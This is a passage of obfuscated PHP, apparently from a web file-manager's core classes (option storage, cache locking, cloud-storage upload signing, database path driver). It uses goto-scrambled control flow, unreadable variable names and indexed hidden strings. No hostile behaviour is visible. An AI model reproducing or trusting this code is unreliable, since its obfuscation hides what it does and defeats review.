$FÍÙğœê < count($aìÀÙºÏÁ£); $FÍÙğœê++) { $c¯“ÛŒâ‘Ñ[$cÀ’¦Şé[389] . $aìÀÙºÏÁ£[$FÍÙğœê][$cÀ’¦Şé[392]]] = $aìÀÙºÏÁ£[$FÍÙğœê]; } return Model($this->modelType)->set($c¯“ÛŒâ‘Ñ, !1, $this->optionType); } private function getAutoName($B¤ÎùäğŠ) { $D­ÚŸï“Ú¥ = array_to_keyvalue($this->listData(), $_SERVER[Ïº«‚ßèÔˆø][28]); if (!$D­ÚŸï“Ú¥ || !isset($D­ÚŸï“Ú¥[$B¤ÎùäğŠ])) { return $B¤ÎùäğŠ; } for ($BøŸ—¥ÈÉ… = 1; $BøŸ—¥ÈÉ… < count($D­ÚŸï“Ú¥); $BøŸ—¥ÈÉ…++) { $b®åÂÛæÈ = $B¤ÎùäğŠ . "\x28{$BøŸ—¥ÈÉ…}\51"; if (!isset($D­ÚŸï“Ú¥[$b®åÂÛæÈ])) { return $b®åÂÛæÈ; } } return $b®åÂÛæÈ; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($a¼…ç—é¥£ = false, $EÔƒ©ğ›‰ = '', $BÂ’òÉ…½ = false) { goto BÈĞÔœ¦ˆ‚; BÈĞÔœ¦ˆ‚: $a³ì¿Ê«· =& $_SERVER[Ïº«‚ßèÔˆø]; $EàÁíæ˜Ğ… = $this->cacheGet($EÔƒ©ğ›‰); $eì¶™öÆñ¤ = $this->optionDefault($EÔƒ©ğ›‰); goto C¤ñä ¾”Ó; C¤ñä ¾”Ó: $eì¶™öÆñ¤ = is_array($eì¶™öÆñ¤) ? $eì¶™öÆñ¤ : array(); if (is_array($EàÁíæ˜Ğ…)) { $EàÁíæ˜Ğ… = array_merge($eì¶™öÆñ¤, $EàÁíæ˜Ğ…); return $a¼…ç—é¥£ ? isset($EàÁíæ˜Ğ…[$a¼…ç—é¥£]) ? $EàÁíæ˜Ğ…[$a¼…ç—é¥£] : null : $EàÁíæ˜Ğ…; } $dõòÓãß = $this->filterWhere(array($a³ì¿Ê«·[29] => $EÔƒ©ğ›‰)); goto FÛÇå¶¤¸È; FÛÇå¶¤¸È: $EàÁíæ˜Ğ… = $this->where($dõòÓãß)->select(); $EàÁíæ˜Ğ… = array_to_keyvalue($EàÁíæ˜Ğ…, $a³ì¿Ê«·[93], $a³ì¿Ê«·[371]); foreach ($EàÁíæ˜Ğ… as $cä¬ƒİùƒ¼ => $f‘¤¯Š³Ü) { if ($BÂ’òÉ…½ || in_array($cä¬ƒİùƒ¼, $this->jsonField)) { $EàÁíæ˜Ğ…[$cä¬ƒİùƒ¼] = json_decode($f‘¤¯Š³Ü, !0); } } goto A¿¤İ¶˜Ò; A¿¤İ¶˜Ò: $this->cacheSet($EÔƒ©ğ›‰, $EàÁíæ˜Ğ…); $EàÁíæ˜Ğ… = array_merge($eì¶™öÆñ¤, $EàÁíæ˜Ğ…); return $a¼…ç—é¥£ ? $EàÁíæ˜Ğ…[$a¼…ç—é¥£] : $EàÁíæ˜Ğ…; goto a¨£ÍèŠÖ; a¨£ÍèŠÖ: } public function set($DŒ»…Ä„Æù, $d‘×Ò„¤ÑŒ = false, $B¥Œôª¬ƒŸ = '') { goto Fª›Œ–ŞæÄ; DÈŞäášä: $B¿ŠÖ“‘î = is_array($DŒ»…Ä„Æù) ? $DŒ»…Ä„Æù : array($DŒ»…Ä„Æù => $d‘×Ò„¤ÑŒ); foreach ($B¿ŠÖ“‘î as $CÒóÓ·Á˜ => $dÖƒƒÉ œŒ) { if (is_array($dÖƒƒÉ œŒ)) { $dÖƒƒÉ œŒ = json_encode_force($dÖƒƒÉ œŒ); } $this->checkLength($dÖƒƒÉ œŒ, !1, $this->tableName . $f’ÄêáÀ¿[4] . $DŒ»…Ä„Æù); $dÖƒƒÉ œŒ = self::textEncode($dÖƒƒÉ œŒ); $B¿ŠÖ“‘î = array($f’ÄêáÀ¿[29] => $B¥Œôª¬ƒŸ, $f’ÄêáÀ¿[93] => $CÒóÓ·Á˜, $f’ÄêáÀ¿[371] => $dÖƒƒÉ œŒ); $b’É•É®[] = $this->filterWhere($B¿ŠÖ“‘î); } if (!$b’É•É®) { return !0; } goto Dâà™³; Dâà™³: return $this->addAll($b’É•É®, array(), !0); goto fİÎßó¹; Fª›Œ–ŞæÄ: $f’ÄêáÀ¿ =& $_SERVER[Ïº«‚ßèÔˆø]; $this->cacheRemove($B¥Œôª¬ƒŸ); $b’É•É® = array(); goto DÈŞäášä; fİÎßó¹: } protected function optionDefault($Bø—Ò›©‡ = '') { return !1; } public function setDeep($dÊĞë±–æã, $CÎ½·éŸÓ = false, $Eƒ¹à²¹¹¤ = '') { $f Î Ş‡‹Î = explode($_SERVER[Ïº«‚ßèÔˆø][95], $dÊĞë±–æã); $F²ÅĞÇ¯áà = $this->get(); array_set_value($F²ÅĞÇ¯áà, $dÊĞë±–æã, $CÎ½·éŸÓ); $this->set($f Î Ş‡‹Î[0], $F²ÅĞÇ¯áà[$f Î Ş‡‹Î[0]], $Eƒ¹à²¹¹¤); } public function remove($F°ÄË”‹í, $c³óºÇÜÊ¸ = '') { $dùÍœ¡¹» =& $_SERVER[Ïº«‚ßèÔˆø]; $this->cacheRemove($c³óºÇÜÊ¸); $b¦¾×ÏÙ­Í = $this->filterWhere(array($dùÍœ¡¹»[93] => $F°ÄË”‹í, $dùÍœ¡¹»[29] => $c³óºÇÜÊ¸)); if (is_null($F°ÄË”‹í)) { unset($b¦¾×ÏÙ­Í[$dùÍœ¡¹»[93]]); } return $this->where($b¦¾×ÏÙ­Í)->delete(); } public function cacheSet($aŒá“¼Ï¬’, $eÓ‹Ò’œø¾ = false) { return Cache::set($this->cacheKey($aŒá“¼Ï¬’), $eÓ‹Ò’œø¾); } public function cacheGet($FÁö‘ãÇÇ) { return Cache::get($this->cacheKey($FÁö‘ãÇÇ)); } public function cacheRemove($eØñˆö¹Â) { return Cache::remove($this->cacheKey($eØñˆö¹Â)); } protected function filterWhere($E‡®‘¶ø¦) { return $E‡®‘¶ø¦; } protected function cacheKey($D…Äæ›®Õ¬) { return $D…Äæ›®Õ¬; } } goto cÖç°œÇ; a×Áí”Ùˆ: class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto CŠš¾²¡”´; CŠš¾²¡”´: $EÖâ½¦©—­ =& $_SERVER[Ïº«‚ßèÔˆø]; if (self::$handle) { return self::$handle; } $f×àÅ‹À½™ = $GLOBALS[$EÖâ½¦©—­[6]][$EÖâ½¦©—­[346]]; goto e–ÍÅ–³¿­; e–ÍÅ–³¿­: self::$timeout = $f×àÅ‹À½™[$EÖâ½¦©—­[797]] ? $f×àÅ‹À½™[$EÖâ½¦©—­[797]] : 10; $b‡‡Æäß²¾ = _get($GLOBALS[$EÖâ½¦©—­[6]], $EÖâ½¦©—­[798]); $aÃíáŒõ = $f×àÅ‹À½™[$EÖâ½¦©—­[784]] ? $f×àÅ‹À½™[$EÖâ½¦©—­[784]] : $EÖâ½¦©—­[192]; goto eå˜ß‚ñ¤İ; eå˜ß‚ñ¤İ: if ($aÃíáŒõ == $EÖâ½¦©—­[17] && $b‡‡Æäß²¾ == $EÖâ½¦©—­[9]) { $aÃíáŒõ = $EÖâ½¦©—­[192]; } switch ($aÃíáŒõ) { case $EÖâ½¦©—­[787]: self::$handle = new CacheLockRedis(); break; case $EÖâ½¦©—­[788]: self::$handle = new CacheLockMemcached(); break; case $EÖâ½¦©—­[17]: self::$handle = new CacheLockDatabase(); break; case $EÖâ½¦©—­[192]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto d’ªßÔàŒï; d’ªßÔàŒï: } private static function key($b¬ÄçÛ–ø’) { return $_SERVER[Ïº«‚ßèÔˆø][799] . Cache::key($b¬ÄçÛ–ø’); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($aöÎ·¬©˜Š = '') { self::$errorMsg = $aöÎ·¬©˜Š; } public static function lockGlobal($dà½ª“ª—, $BõÌİÏØØ) { return self::lock($dà½ª“ª—, $BõÌİÏØØ, !0); } public static function lock($aêµ‡²ï÷, $BÔ–¦ÍË– = false, $CÕÔ†‰‡¨Ú = false) { goto c¾¿£™©é; a¼©Û‚ÜÜ¢: $BÔ–¦ÍË– = $BÔ–¦ÍË– ? $BÔ–¦ÍË– : self::$timeout; $C˜‹…¢œ…… = $cçáĞ„ç»æ->lock($e­™»Ãµ²î, $BÔ–¦ÍË–); if (!$C˜‹…¢œ……) { $a¥ÍçöÀêó = "\154\157\x63\x6b\40\145\162\162\x6f\x72\73\153\x65\x79\75{$aêµ‡²ï÷}\x3b\x74\151\x6d\145\75{$BÔ–¦ÍË–}\73" . self::$errorMsg . $Aª½×¬º¾Õ[68] . get_caller_msg(); $eò£îæ‘—‘ = LNG($Aª½×¬º¾Õ[800]) . "\x28{$BÔ–¦ÍË–}\163\x29\x2e" . LNG($Aª½×¬º¾Õ[801]); $eò£îæ‘—‘ .= $Aª½×¬º¾Õ[802]; if (is_string(self::$errorMsg) && self::$errorMsg) { $eò£îæ‘—‘ = $eò£îæ‘—‘ . $Aª½×¬º¾Õ[803] . self::$errorMsg; } write_log($a¥ÍçöÀêó, $Aª½×¬º¾Õ[804]); show_json($eò£îæ‘—‘, !1); } goto bâ«Å‰•‘Â; c¾¿£™©é: $Aª½×¬º¾Õ =& $_SERVER[Ïº«‚ßèÔˆø]; $cçáĞ„ç»æ = self::init(); $e­™»Ãµ²î = self::key($aêµ‡²ï÷); goto a¼©Û‚ÜÜ¢; bâ«Å‰•‘Â: if (!$CÕÔ†‰‡¨Ú) { self::$lockItem[$e­™»Ãµ²î] = !0; } return $C˜‹…¢œ……; goto eó×ØˆŸ˜î; eó×ØˆŸ˜î: } public static function lockGet($CÏÅìÒˆÅš) { $f×Ô‘Ìë…° = self::key($CÏÅìÒˆÅš); if (self::$lockItem[$f×Ô‘Ìë…°]) { return self::$lockItem[$f×Ô‘Ìë…°]; } return self::init()->lockGet($f×Ô‘Ìë…°); } public static function unlock($CÃ¢É˜™Ø) { $f£¿Ğõæ„¼ = self::key($CÃ¢É˜™Ø); self::$lockItem[$f£¿Ğõæ„¼] = null; return self::init()->unlock($f£¿Ğõæ„¼); } public static function unlockRuntime() { $E‘‹£±ÕäÈ =& $_SERVER[Ïº«‚ßèÔˆø]; $a¤¤—®®›³ = self::init(); $a¬ÕáÚ¥¶š = !1; foreach (self::$lockItem as $F×÷¼Ò => $fĞë‘åƒİ») { if (!$fĞë‘åƒİ») { continue; } $a¤¤—®®›³->unlock($F×÷¼Ò); if (!$a¬ÕáÚ¥¶š) { $a¬ÕáÚ¥¶š = !0; write_log($E‘‹£±ÕäÈ[805] . $F×÷¼Ò . $E‘‹£±ÕäÈ[68] . get_caller_msg(), $E‘‹£±ÕäÈ[804]); continue; } write_log($E‘‹£±ÕäÈ[805] . $F×÷¼Ò, $E‘‹£±ÕäÈ[804]); } self::fileUnlockAll(); } public static function fileLock($fâ¾í¡ÂÛ„) { goto BõÆºïá„É; BõÆºïá„É: $Cñ†•ÂŸ¡“ =& $_SERVER[Ïº«‚ßèÔˆø]; if (!$GLOBALS[$Cñ†•ÂŸ¡“[806]]) { $GLOBALS[$Cñ†•ÂŸ¡“[806]] = array(); } $GLOBALS[$Cñ†•ÂŸ¡“[806]][$fâ¾í¡ÂÛ„] = !1; goto C©òØß‰±Œ; C©òØß‰±Œ: $dí©±§ö±ó = fopen(DATA_PATH . $fâ¾í¡ÂÛ„ . $Cñ†•ÂŸ¡“[807], $Cñ†•ÂŸ¡“[808]); if (!$dí©±§ö±ó) { return !1; } $GLOBALS[$Cñ†•ÂŸ¡“[806]][$fâ¾í¡ÂÛ„] = $dí©±§ö±ó; goto eæ¢±£»; eæ¢±£»: if (flock($dí©±§ö±ó, LOCK_EX)) { return !0; } self::unlock($fâ¾í¡ÂÛ„); show_json($Cñ†•ÂŸ¡“[809], !1); goto a¶¢À¯ÈÛ°; a¶¢À¯ÈÛ°: return !1; goto Bå­–Åßª¾; Bå­–Åßª¾: } public static function fileUnlock($eÛÕê½›¸Í) { $FºÂèÈ³…‰ =& $_SERVER[Ïº«‚ßèÔˆø]; $dâêí•¤š¥ = $GLOBALS[$FºÂèÈ³…‰[806]][$eÛÕê½›¸Í]; if (!$dâêí•¤š¥) { return; } $GLOBALS[$FºÂèÈ³…‰[806]][$eÛÕê½›¸Í] = !1; flock($dâêí•¤š¥, LOCK_UN); fclose($dâêí•¤š¥); } public static function fileUnlockAll() { $Fô¾‰È®Œ =& $_SERVER[Ïº«‚ßèÔˆø]; if (!$GLOBALS[$Fô¾‰È®Œ[806]]) { return; } foreach ($GLOBALS[$Fô¾‰È®Œ[806]] as $cŒ‚•âåìˆ => $E¡àÁöòÖÚ) { if (!$E¡àÁöòÖÚ) { continue; } $GLOBALS[$Fô¾‰È®Œ[806]][$cŒ‚•âåìˆ] = !1; flock($E¡àÁöòÖÚ, LOCK_UN); fclose($E¡àÁöòÖÚ); } $GLOBALS[$Fô¾‰È®Œ[806]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $Fæè‘¶îê =& $_SERVER[Ïº«‚ßèÔˆø]; $b˜‘ŒÉ¦„ = $GLOBALS[$Fæè‘¶îê[6]][$Fæè‘¶îê[346]]; self::$cachePath = $b˜‘ŒÉ¦„[$Fæè‘¶îê[192]][$Fæè‘¶îê[76]]; @mkdir(self::$cachePath, 511, !0); } public function lock($fóô¤Ä¸²•, $Cæõ æÙ = 0) { goto b«œÌ…ÜÏÔ; Cô„‘Ş‹˜: $D×¤¿ùÑ¶Ä = rtrim(self::$cachePath, $b„íğ‚´œ‹[8]) . $b„íğ‚´œ‹[810] . md5($fóô¤Ä¸²•) . $b„íğ‚´œ‹[807]; if (file_exists($D×¤¿ùÑ¶Ä) && filemtime($D×¤¿ùÑ¶Ä) && filemtime($D×¤¿ùÑ¶Ä) < time() - 10) { @unlink($D×¤¿ùÑ¶Ä); } do { if (file_exists($D×¤¿ùÑ¶Ä)) { cacheLockWait(); continue; } $e¹ˆïŠ‘£Õ = fopen($D×¤¿ùÑ¶Ä, $b„íğ‚´œ‹[811]); if (!$e¹ˆïŠ‘£Õ) { return !1; } $d¨Çíª•‘‚ = flock($e¹ˆïŠ‘£Õ, LOCK_EX | LOCK_NB); self::$caches[$fóô¤Ä¸²•] = array($b„íğ‚´œ‹[812] => $e¹ˆïŠ‘£Õ, $b„íğ‚´œ‹[192] => $D×¤¿ùÑ¶Ä); fwrite($e¹ˆïŠ‘£Õ, $A®•ˆˆâö); clearstatcache(); if ($e¹ˆïŠ‘£Õ && $d¨Çíª•‘‚) { return !0; } cacheLockWait(); } while (microtime(!0) < $A®•ˆˆâö); goto F˜ëîÄŠ×‰; b«œÌ…ÜÏÔ: $b„íğ‚´œ‹ =& $_SERVER[Ïº«‚ßèÔˆø]; $CÍœ¹Ñéáœ = microtime(!0); $A®•ˆˆâö = $CÍœ¹Ñéáœ + $Cæõ æÙ + 0.0001; goto Cô„‘Ş‹˜; F˜ëîÄŠ×‰: $this->unlock($fóô¤Ä¸²•); return !1; goto A…Œ÷¼¸˜¬; A…Œ÷¼¸˜¬: } public function lockGet($AâèòåËàº) { $dÊ½¼æ™‹ê =& $_SERVER[Ïº«‚ßèÔˆø]; $cĞ¤æ¸¦° = rtrim(self::$cachePath, $dÊ½¼æ™‹ê[8]) . $dÊ½¼æ™‹ê[810] . md5($AâèòåËàº) . $dÊ½¼æ™‹ê[807]; return file_exists($cĞ¤æ¸¦°); } public function unlock($EïÅ«£ŞÇ) { goto cÉÅø˜¢Æš; FÂ‚²Îèì: unset(self::$caches[$EïÅ«£ŞÇ]); goto D»ŞèÍÕœ; cÉÅø˜¢Æš: $B ¬äÁ¨Ø =& $_SERVER[Ïº«‚ßèÔˆø]; $B°À’ÈÒ = self::$caches[$EïÅ«£ŞÇ]; if (!$B°À’ÈÒ) { return; } goto a‚†™ö‘ò; a‚†™ö‘ò: @flock($B°À’ÈÒ[$B ¬äÁ¨Ø[812]], LOCK_UN); @fclose($B°À’ÈÒ[$B ¬äÁ¨Ø[812]]); @unlink($B°À’ÈÒ[$B ¬äÁ¨Ø[192]]); goto FÂ‚²Îèì; D»ŞèÍÕœ: } } goto F³Ä´¬Á‰œ; f¨ë‚¬Ğ·Ó: class PathDriverCOS extends PathDriverBaseS3 { public function __construct($BÛÊÇÈ°Ò¾) { parent::__construct($BÛÊÇÈ°Ò¾); $this->signatureVersion($_SERVER[Ïº«‚ßèÔˆø][211]); } public function uploadFormData($EÏî… É, $Eƒä±Í”ä¥ = 3600) { goto D†ññ²À¬Æ; D†ññ²À¬Æ: $C½¥²Ï¿˜ =& $_SERVER[Ïº«‚ßèÔˆø]; $b‘ ëºŞ•‘ = $C½¥²Ï¿˜[191]; $dÀÚîˆ‚ê´ = $C½¥²Ï¿˜[229]; goto eè‚î†ò¾; Dë„ñ‚–½­: $fºÔãæå°Ä = sha1($D¼¦¢©†Ü); $bÛœ‹ƒõƒ = hash_hmac($C½¥²Ï¿˜[229], $fºÔãæå°Ä, $dç“¥ôÙ©); $aèªåâù—° = array($C½¥²Ï¿˜[1174] => $b‘ ëºŞ•‘, $C½¥²Ï¿˜[1178] => $Dœ—„»Ò·¼, $C½¥²Ï¿˜[1182] => base64_encode($D¼¦¢©†Ü), $C½¥²Ï¿˜[1179] => $dÀÚîˆ‚ê´, $C½¥²Ï¿˜[1180] => $this->accessKey, $C½¥²Ï¿˜[1183] => $B‹ÛãÄäÒ, $C½¥²Ï¿˜[1184] => $bÛœ‹ƒõƒ, $C½¥²Ï¿˜[175] => $this->getHost()); goto BÅİ¡á£‡–; eè‚î†ò¾: $Dœ—„»Ò·¼ = $C½¥²Ï¿˜[1170]; $Fî‘’ÙİÎË = gmdate($C½¥²Ï¿˜[1171], time() + $Eƒä±Í”ä¥); $B‹ÛãÄäÒ = (string) time() . $C½¥²Ï¿˜[68] . (string) (time() + $Eƒä±Í”ä¥); goto CÆ¹‘Œ¡¡Û; CÆ¹‘Œ¡¡Û: $D¼¦¢©†Ü = array($C½¥²Ï¿˜[1172] => $Fî‘’ÙİÎË, $C½¥²Ï¿˜[1173] => array(array($C½¥²Ï¿˜[1174] => $b‘ ëºŞ•‘), array($C½¥²Ï¿˜[1175] => $this->bucket), array($C½¥²Ï¿˜[1176], $C½¥²Ï¿˜[1177], $C½¥²Ï¿˜[33]), array($C½¥²Ï¿˜[1178] => $Dœ—„»Ò·¼), array($C½¥²Ï¿˜[1179] => $dÀÚîˆ‚ê´), array($C½¥²Ï¿˜[1180] => $this->accessKey), array($C½¥²Ï¿˜[1181] => $B‹ÛãÄäÒ))); $D¼¦¢©†Ü = json_encode($D¼¦¢©†Ü); $dç“¥ôÙ© = hash_hmac($C½¥²Ï¿˜[229], $B‹ÛãÄäÒ, $this->secret); goto Dë„ñ‚–½­; BÅİ¡á£‡–: return $aèªåâù—°; goto F“ïÅÜÃ; F“ïÅÜÃ: } public function fileOutLink($døæÈŞ˜‰) { $d¾ò”¡…ø =& $_SERVER[Ïº«‚ßèÔˆø]; if (substr($døæÈŞ˜‰, 0, 7) == $d¾ò”¡…ø[1185]) { $døæÈŞ˜‰ = $d¾ò”¡…ø[1186] . substr($døæÈŞ˜‰, 7); } header($d¾ò”¡…ø[159] . $døæÈŞ˜‰); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($eˆéòêÆÄµ) { $this->pathParse = $eˆéòêÆÄµ; $this->model = Model($_SERVER[Ïº«‚ßèÔˆø][1187]); } public function getPath($eê‘»µ«®) { return trim($eê‘»µ«®, $_SERVER[Ïº«‚ßèÔˆø][8]); } public function pathFather($c“…«‚ÜÑç) { $F“ô²¶“Ãƒ = $this->parse($c“…«‚ÜÑç); $F“ô²¶“Ãƒ = $this->infoSimple($c“…«‚ÜÑç); return $F“ô²¶“Ãƒ ? $F“ô²¶“Ãƒ[$_SERVER[Ïº«‚ßèÔˆø][476]] : !1; } public function pathThis($aÙõ³–°) { $eÒ­Óß–‹Â = $this->infoSimple($aÙõ³–°); return $eÒ­Óß–‹Â ? $eÒ­Óß–‹Â[$_SERVER[Ïº«‚ßèÔˆø][28]] : !1; } public function getPathOuter($AªãÌ·Î–) { if (!$AªãÌ·Î–) { return $AªãÌ·Î–; } $EšéÓÓÎ¬§ = $this->parse($AªãÌ·Î–); return KodIO::make($EšéÓÓÎ¬§[$_SERVER[Ïº«‚ßèÔˆø][392]]); } public function copyFolderFromIO($b‰¶º¹ù½, $b’±’–ÈÀ…, $BïÔÊ÷õ„¶, $AÅª‚ù²“ê, $Eõ™‘¦÷ù) { $d›ÌŠœ®‚“ = $this->model->copyFolderFromIO($b‰¶º¹ù½, $b’±’–ÈÀ…, $BïÔÊ÷õ„¶, $AÅª‚ù²“ê, $Eõ™‘¦÷ù); return KodIO::make($d›ÌŠœ®‚“); } public function isParentOf($dëä¦ëò»Á, $aÅ¦õ¥æ¤Ì) { return $this->model->isParentOf($dëä¦ëò»Á, $aÅ¦õ¥æ¤Ì); } public function mkfile($dñº†º˜ÄÕ, $FÀ‚øìµ— = '', $f”›¥ø—š = REPEAT_RENAME) { $c¿Ï‚ê²òŒ =& $_SERVER[Ïº«‚ßèÔˆø]; $bšø»²Şª§ = $this->parse($dñº†º˜ÄÕ); $dñº†º˜ÄÕ = $bšø»²Şª§[$c¿Ï‚ê²òŒ[392]]; for ($e‡ÁÚò°—õ = 0; $e‡ÁÚò°—õ < count($bšø»²Şª§[$c¿Ï‚ê²òŒ[1188]]); $e‡ÁÚò°—õ++) { $B¢¥ç†˜Ëê = $bšø»²Şª§[$c¿Ï‚ê²òŒ[1188]][$e‡ÁÚò°—õ]; if ($e‡ÁÚò°—õ == count($bšø»²Şª§[$c¿Ï‚ê²òŒ[1188]]) - 1) { $dñº†º˜ÄÕ = $this->model->mkfile($dñº†º˜ÄÕ, $B¢¥ç†˜Ëê, $FÀ‚øìµ—, $f”›¥ø—š); break; } $dñº†º˜ÄÕ = $this->model->mkdir($dñº†º˜ÄÕ, $B¢¥ç†˜Ëê, REPEAT_SKIP); } return $this->getPathOuter($dñº†º˜ÄÕ); } public function mkdir($A‘»ÄÍ†Íó, $e ò¬èŸå = REPEAT_SKIP) { $cµ‚Ö”™†Ë =& $_SERVER[Ïº«‚ßèÔˆø]; $bĞ„ËôÇº° = $this->parse($A‘»ÄÍ†Íó); $A‘»ÄÍ†Íó = $bĞ„ËôÇº°[$cµ‚Ö”™†Ë[392]]; for ($Dğ¸ÂñÅŞÙ = 0; $Dğ¸ÂñÅŞÙ < count($bĞ„ËôÇº°[$cµ‚Ö”™†Ë[1188]]); $Dğ¸ÂñÅŞÙ++) { $Dô‡ãİ£Î„ = $bĞ„ËôÇº°[$cµ‚Ö”™†Ë[1188]][$Dğ¸ÂñÅŞÙ]; $A‘»ÄÍ†Íó = $this->model->mkdir($A‘»ÄÍ†Íó, $Dô‡ãİ£Î„, $e ò¬èŸå); } return $this->getPathOuter($A‘»ÄÍ†Íó); } public function copyFile($Dõ‘æ®ø¡, $câœÅ’Å®ª, $cÜô¹ÔóÉÓ = REPEAT_REPLACE) { $DÈÄ¶ãÕÁ =& $_SERVER[Ïº«‚ßèÔˆø]; $E¸É‰ÅŞŠä = $this->parse($câœÅ’Å®ª); $d•‡“Ğ²Õë = $this->model->copy($Dõ‘æ®ø¡, $E¸É‰ÅŞŠä[$DÈÄ¶ãÕÁ[392]], $cÜô¹ÔóÉÓ, $E¸É‰ÅŞŠä[$DÈÄ¶ãÕÁ[76]]); return $d•‡“Ğ²Õë ? $this->getPathOuter($d•‡“Ğ²Õë) : !1; } public function moveFile($Cì•“ƒé , $B‘Üò»¹È•, $AÓöÑÃÏí” = REPEAT_REPLACE) { $cÁ×ÕÑáÇ¤ =& $_SERVER[Ïº«‚ßèÔˆø]; $Bä‘‰È‘Âõ = $this->parse($B‘Üò»¹È•); $eøê¹¢Øö = $this->model->move($Cì•“ƒé , $Bä‘‰È‘Âõ[$cÁ×ÕÑáÇ¤[392]], $AÓöÑÃÏí”, $Bä‘‰È‘Âõ[$cÁ×ÕÑáÇ¤[76]]); return $eøê¹¢Øö ? $this->getPathOuter($eøê¹¢Øö) : !1; } public function copy($E½‰í¡Ãª˜, $f“œ®Ó–ÁÕ, $f‡¦‰Ğ²ŠŞ = REPEAT_REPLACE) { $a…ìõ‹„Å¢ = $this->parse($f“œ®Ó–ÁÕ); $eˆŒîÌÒŠ© = $this->model->copy($E½‰í¡Ãª˜, $a…ìõ‹„Å¢[$_SERVER[Ïº«‚ßèÔˆø][392]], $f‡¦‰Ğ²ŠŞ); return $eˆŒîÌÒŠ© ? $this->getPathOuter($eˆŒîÌÒŠ©) : !1; } public function moveSameAllow() { } public function move($A„Ÿ£ÍÉ…£, $EÜô›‡¶Â², $CéÊ•È­Š£ = REPEAT_REPLACE) { $cèåªùÍ¾í = $this->parse($EÜô›‡¶Â²); $e×©éôù² = $this->model->move($A„Ÿ£ÍÉ…£, $cèåªùÍ¾í[$_SERVER[Ïº«‚ßèÔˆø][392]], $CéÊ•È­Š£); return $e×©éôù² ? $this->getPathOuter($e×©éôù²) : !1; } public function remove($BÏÊô‚ã, $A½Ş¡Ç„Ü³ = true) { return $this->model->remove($BÏÊô‚ã, $A½Ş¡Ç„Ü³); } public function rename($EëÚ•“Ôá, $F‹œ×öÓÎå) { $Dó–æ‰âÈÒ = $this->model->rename($EëÚ•“Ôá, $F‹œ×öÓÎå); return $Dó–æ‰âÈÒ ? $this->getPathOuter($EëÚ•“Ôá) : $Dó–æ‰âÈÒ; } public function size($a–•Ãõ¡Ê¨) { $D¶ Êí±› = $this->infoSimple($a–•Ãõ¡Ê¨); return $D¶ Êí±› ? $D¶ Êí±›[$_SERVER[Ïº«‚ßèÔˆø][78]] : 0; } public function infoSimple($e¢—×ï¢å’) { return $this->model->sourceInfo($e¢—×ï¢å’); } public function info($aù°‘œ°¿Ë) { return $this->infoParse($aù°‘œ°¿Ë); } public function infoAuth($A½‘ãÁ¹ŒÜ) { return $this->infoParse($A½‘ãÁ¹ŒÜ, !1, !0); } public function infoWithChildren($AµÃ‰Ğé¤Õ) { return $this->infoParse($AµÃ‰Ğé¤Õ, !0); } protected function infoParse($BÑÉã¤ÁËò, $C¼­ºÜ®·Â = false, $B˜áÙòšŒ¬ = false) { if (!$C¼­ºÜ®·Â) { return $this->model->pathInfo($BÑÉã¤ÁËò, $B˜áÙòšŒ¬); } return $this->model->pathInfoMore($BÑÉã¤ÁËò); } public function infoFull($cğÚ”œ½×) { $aŠ¥ø™‡ø =& $_SERVER[Ïº«‚ßèÔˆø]; $aŠñ‡•ñ¯ˆ = explode($aŠ¥ø™‡ø[8], $cğÚ”œ½×); $e¥‹„…ìó = implode($aŠ¥ø™‡ø[8], array_splice($aŠñ‡•ñ¯ˆ, 1)); return $this->model->pathInfoByPath($aŠñ‡•ñ¯ˆ[0], $e¥‹„…ìó); } public function hashSimple($cĞõà‡†µ–) { $F™¶½ï™Ú =& $_SERVER[Ïº«‚ßèÔˆø]; $c£À·ÌšŠí = $this->infoWithChildren($cĞõà‡†µ–); return $c£À·ÌšŠí[$F™¶½ï™Ú[164]][$F™¶½ï™Ú[171]]; } public function hashMd5($d¹¤£Éë½É) { $AÈ¨¸É¨… =& $_SERVER[Ïº«‚ßèÔˆø]; $E¡öòá‘½Ë = $this->infoWithChildren($d¹¤£Éë½É); return $E¡öòá‘½Ë[$AÈ¨¸É¨…[164]][$AÈ¨¸É¨…[170]]; } public function exist($F†»›×éÚç) { $c±ØÓå‘ ğ =& $_SERVER[Ïº«‚ßèÔˆø]; $C¯õ¶ÀñÕç = $this->parse($F†»›×éÚç); if (!$C¯õ¶ÀñÕç[$c±ØÓå‘ ğ[76]]) { return $this->isFile($F†»›×éÚç) || $this->isFolder($F†»›×éÚç); } $EÂôÜ˜íÌ· = array($c±ØÓå‘ ğ[393] => $C¯õ¶ÀñÕç[$c±ØÓå‘ ğ[392]], $c±ØÓå‘ ğ[28] => $C¯õ¶ÀñÕç[$c±ØÓå‘ ğ[76]]); $D²¢ğ¾õî² = $this->model->where($EÂôÜ˜íÌ·)->find(); return $D²¢ğ¾õî² ? !0 : !1; } public function isFile($Câ±„Ã¯™) { $DŞë¸Ù‹†À =& $_SERVER[Ïº«‚ßèÔˆø]; $fƒŒÅ„²ÓÒ = $this->infoSimple($Câ±„Ã¯™); return $fƒŒÅ„²ÓÒ && $fƒŒÅ„²ÓÒ[$DŞë¸Ù‹†À[401]] == $DŞë¸Ù‹†À[87] ? !1 : !0; } public function isFolder($bİ‘Ñ·ÀŠğ) { $A‡•øÚÓ—À =& $_SERVER[Ïº«‚ßèÔˆø]; $CÙ‚‘Î¶ŒÙ = $this->infoSimple($bİ‘Ñ·ÀŠğ); return $CÙ‚‘Î¶ŒÙ && $CÙ‚‘Î¶ŒÙ[$A‡•øÚÓ—À[401]] == $A‡•øÚÓ—À[87] ? !0 : !1; } public function listPath($DĞ¸šò‚¿ , $Dï¤ç™ï‰ = false) { $d†óã¡­òÖ =& $_SERVER[Ïº«‚ßèÔˆø]; if ($DĞ¸šò‚¿  == $d†óã¡­òÖ[33]) { return !1; } $A™…¥í› = array($d†óã¡­òÖ[393] => $DĞ¸šò‚¿ ); if ($Dï¤ç™ï‰) { return $this->model->listSource($A™…¥í›, -1); } return $this->model->listSource($A™…¥í›); } public function has($fË˜£õ×ª³, $eŒ¥åÆÈ†Ä = false, $fÛÜ›”ƒ©Å = null) { $dã»ôÖìí¾ =& $_SERVER[Ïº«‚ßèÔˆø]; 